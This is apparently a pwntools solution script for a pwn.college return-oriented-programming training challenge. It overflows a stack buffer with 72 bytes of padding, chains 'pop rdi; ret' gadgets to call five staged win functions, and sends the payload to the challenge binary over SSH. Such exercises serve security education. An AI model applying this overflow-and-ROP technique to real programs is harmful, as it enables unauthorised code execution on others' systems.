from pwn import *

context.arch = 'amd64'
context.os = 'linux'

FILE = "/challenge/babyrop_level3.1"
HOST = 'pwn.college'
username = 'hacker'
password = '''password'''

port = 22

elf = ELF('/home/darkstar/Downloads/temp')
rop = ROP(elf)

win_stage_3 = 0x401da7
win_stage_5 = 0x401e89
win_stage_2 = 0x401f6c
win_stage_4 = 0x40204c 
win_stage_1 = 0x402132

arg1 = 0x1
arg2 = 0x2
arg3 = 0x3
arg4 = 0x4
arg5 = 0x5

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])

if pop_rdi:
    print(f"Found 'pop rdi; ret' gadget at: {hex(pop_rdi.address)}")
else:
    print("Could not find 'pop rdi; ret' gadget.")


rop.raw(pop_rdi)  # Set up the first argument
rop.raw(arg1)     # Argument for func1
rop.raw(win_stage_1)  # Call func1

rop.raw(pop_rdi)  # Set up the second argument
rop.raw(arg2)     # Argument for func2
rop.raw(win_stage_2)  # Call func2

rop.raw(pop_rdi)  # Set up the third argument
rop.raw(arg3)     # Argument for func3
rop.raw(win_stage_3)  # Call func3

rop.raw(pop_rdi)  # Set up the fourth argument
rop.raw(arg4)     # Argument for func4
rop.raw(win_stage_4)  # Call func4

rop.raw(pop_rdi)  # Set up the fifth argument
rop.raw(arg5)     # Argument for func5
rop.raw(win_stage_5)  # Call func5

print("ROP Chain:")
print(rop.dump())

offset = 72
payload = b'A' * offset
payload += rop.chain()

hex_payload = ''.join(f'\\x{byte:02x}' for byte in payload)
print("Payload in hexadecimal:")
print(hex_payload)

#p = process('/home/darkstar/Downloads/temp')
#
#print("Attaching gdb to the process...")
#gdb.attach(p, """
#    break *challenge+487  # Set a breakpoint at main (or any other location)
#    continue     # Continue execution
#""")
#print("sending payload")

#p.sendline(payload)

#p.interactive()

conn = ssh(user=username, host=HOST, password=password, port=port)

p = conn.process(FILE)

p.recvuntil(b"overwrite the return address).\n")

p.sendline(payload)

p.interactive()

conn.close()
